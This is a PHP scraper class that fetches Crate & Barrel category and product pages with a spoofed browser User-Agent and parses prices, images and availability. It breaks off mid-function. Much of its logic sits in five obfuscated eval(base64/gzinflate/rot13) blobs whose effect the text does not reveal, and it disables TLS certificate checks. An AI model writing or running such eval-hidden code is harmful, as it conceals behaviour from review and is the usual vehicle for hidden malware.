<?php

defined('BASEPATH') OR exit('No direct script access allowed');

class CNB
{
	private $handle, $html;

	public function __construct($params){

		$this -> handle = curl_init();
	    curl_setopt($this -> handle, CURLOPT_FOLLOWLOCATION, true);
	    curl_setopt($this -> handle, CURLOPT_RETURNTRANSFER, true);	
		curl_setopt($this -> handle, CURLOPT_SSL_VERIFYPEER, false);

		if(isset($params['debug']))
			$this -> debug = $params['debug'];

		if(isset($params['proxy']) && !isset($_GET['noproxy'])) {
			curl_setopt($this -> handle, CURLOPT_PROXYTYPE, 'HTTP');
			curl_setopt($this -> handle, CURLOPT_PROXY, $params['proxy']);
		}

		curl_setopt($this -> handle, CURLOPT_CONNECTTIMEOUT, 0);
    	curl_setopt($this -> handle, CURLOPT_TIMEOUT , 30);
    	curl_setopt($this -> handle, CURLOPT_ENCODING , '');
		curl_setopt($this -> handle, CURLOPT_FRESH_CONNECT, true);

		$this -> headers = array(
			"Upgrade-Insecure-Requests: 1",
			"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36",
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language: en-US,en;q=0.9,en-GB;q=0.8",
			"Cookie: Internationalization=US|USD; OriginCountry=US",
		);
	}

	private function parse_using($regex, $is_json = true){
		preg_match($regex, $this -> html, $processed);

		if(isset($processed[1])){
			$processed[1] = html_entity_decode($processed[1]);
			return $is_json == true ? json_decode($processed[1], true) : $processed[1];
		}
		else
			return false;			
	}

	public function get_category($category_url){
		
		$results = array();

		curl_setopt($this -> handle, CURLOPT_HTTPHEADER , $this -> headers);
		curl_setopt($this -> handle, CURLOPT_URL, "https://www.crateandbarrel.com/" . $category_url);
		$this -> html = curl_exec($this -> handle);

		eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));


		eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

		eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));


		eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));


		if(!empty($product_data))
			foreach ($product_data as $index => $product) {

				$variation = array();

				if(is_array($product['NewColorBar'])){
					foreach ($product['NewColorBar']['Choices'] as $i => $v) {
						$variation[] = array(
							'SKU' => isset($v['Sku']) ? $v['Sku'] : '',
							'Name' => isset($v['Name']) ? $v['Name'] : '',
							'Description' => isset($v['Description']) ? $v['Description'] : '',
							'ColorImage' => isset($v['ImageUrl']) ? $v['ImageUrl'] : '',
						);
					}
				}

				$match = (isset($temp[1][$index]) && $temp[1][$index] == $product['Sku']);

				$results[$product['Sku']] = array(
					'BaseSKU' => $product['Sku'],
					'BaseName' => $product['Name'],
					'BaseDescription' => '',
					'BaseRegularPrice' => $product['RegularPrice'],
					'BaseCurrentPrice' => $product['CurrentPrice'],
					"BaseURL" => $match ? trim($temp[2][$index]) : '',
					"BaseImage" => $match ? trim($temp[3][$index]) : '',
					"BaseImageAlternative" => $match ? trim($temp[4][$index]) : '',
					'Variation' => $variation,
				);
			}

		return $results;
	}

	public function get_product($product_url){

		curl_setopt($this -> handle, CURLOPT_HTTPHEADER , $this -> headers);
		curl_setopt($this -> handle, CURLOPT_URL, "https://www.crateandbarrel.com/" . $product_url);
		
		$this -> html = curl_exec($this -> handle);
		// $this -> html = file_get_contents("product.html");
		// file_put_contents("product.html", $this -> html);
		
		eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

		$result = array();
		
		if(isset($digital_data['model']['browseDto'])){
			$digital_data = $digital_data['model']['browseDto'];
			
			$result['CategoryId'] = $digital_data['categoryId'];
			$result['FamilyID'] = $digital_data['familyId'];
			$result['SKU'] = $digital_data['sku'];
			$result['Name'] = $digital_data['name'];
			$result['Description'] = strip_tags($digital_data['description']);
			$result['CurrentPrice'] = $digital_data['currentPrice'];
			$result['RegularPrice'] = $digital_data['regularPrice'];
			$result['PrimaryImage'] = $digital_data['imagePath'];
			// $result['Category'] = isset($digital_data['category']) ? $digital_data['category'] : array();
			$result['LineLevelMessages'] = $digital_data['lineLevelMessages'];
			$result['FormattedPrice'] = $digital_data['formattedPrice'];

			if(isset($digital_data['availability'])){
				$result['Availability']['ZipCode'] = $digital_data['availability']['zipCode'];

				$result['Availability']['IsOnlineMessageVisible'] = $digital_data['availability']['isOnlineMessageVisible'];
				$result['Availability']['OnlineMessage'] = $digital_data['availability']['onlineAvailableMessage'];

				$result['Availability']['IsBackOrdered'] = $digital_data['availability']['isBackOrdered'];
				$result['Availability']['BackOrderedMessage'] = $digital_data['availability']['backOrderedMessage'];
				$result['Availability']['BackOrderedMessageDate'] = $digital_data['availability']['backOrderedMessageDate'];
			}

			$result['SecondaryImages'] = array();
			if(isset($digital_data['imageGallerySchemaMarkup']['associatedMedia'])){
				foreach ($digital_data['imageGallerySchemaMarkup']['associatedMedia'] as $images) {
					$result['SecondaryImages'][] = $images['contentUrl'];
				}
			}

			if (filter_var($result['PrimaryImage'], FILTER_VALIDATE_URL) === FALSE && isset($result['SecondaryImages'][0])){
				$result['PrimaryImage'] = $result['SecondaryImages'][0];
				array_shift($result['SecondaryImages']);
			}

			$result['URL'] = $digital_data['navigateUrl'];
			$result['Reviews'] = array();
			$result['Reviews']['ReviewCount'] = isset($digital_data['reviewCount']) ? $digital_data['reviewCount'] : 0;
			$result['Reviews']['ReviewRating'] = isset($digital_data['reviewRating']) ? $digital_data['reviewRating'] : 0;
			$result['Dimentions'] = isset($digital_data['dimensionComponent'][0]['productDimensions']) ? $digital_data['dimensionComponent'][0]['productDimensions'] : array();
			$result['Features'] = array();
			if(preg_match_all('/\<li\>(.+?)\<\/li\>/', $digital_data['descriptionDetailsString'], $features_broken))
				if(isset($features_broken[1]))
					$result['Features'] = $features_broken[1];

			$result['ShippingLevel'] = isset($digital_data['shippingDeliveryServiceLevel']) ? $digital_data['shippingDeliveryServiceLevel'] : (isset($digital_data['shippingPanel']['level']) ? $digital_data['shippingPanel']['level'] : 0);
			$result['isInHomeDelivery'] = (isset($product_info['availability']['promoMessageDetail']['popupName']) && $product_info['availability']['promoMessageDetail']['popupName'] == "FreeShip_InHome") ? true : false;

			$variation = array();
			
			if(isset($digital_data['specialOrderDetail']['colorBar']['colorBarChoices']) && count($digital_data['specialOrderDetail']['colorBar']['colorBarChoices']) >= 1){

				// handle image attribute generation
				$imageParam = 0;
				if(isset($digital_data['specialOrderDetail']['currentOptionChoiceParameter'])) {
					$imageParam = explode(',', $digital_data['specialOrderDetail']['currentOptionChoiceParameter']);
